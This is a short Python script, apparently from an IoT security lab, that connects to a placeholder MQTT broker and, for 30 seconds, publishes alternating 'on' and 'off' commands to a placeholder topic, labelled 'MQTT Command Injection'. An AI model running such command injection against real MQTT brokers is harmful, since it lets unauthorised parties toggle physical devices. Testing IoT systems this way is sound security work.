import time
import paho.mqtt.client as mqtt

BROKER_IP = "MQTT_BROKER_IP"
PORT      = 1883
TOPIC     = "MQTT_TOPIC"        
INTERVAL  = 2
DURATION  = 30

client = mqtt.Client()
client.connect(BROKER_IP, PORT, 60)

print("MQTT Command Injection gestartet...")
start = time.time()
count = 0

while time.time() - start < DURATION:
    cmd = "on" if count % 2 == 0 else "off"
    client.publish(TOPIC, cmd)
    print(f"Gesendet: {cmd}")
    count += 1
    time.sleep(INTERVAL)

print(f"Fertig. {count} Kommandos gesendet.")
client.disconnect()
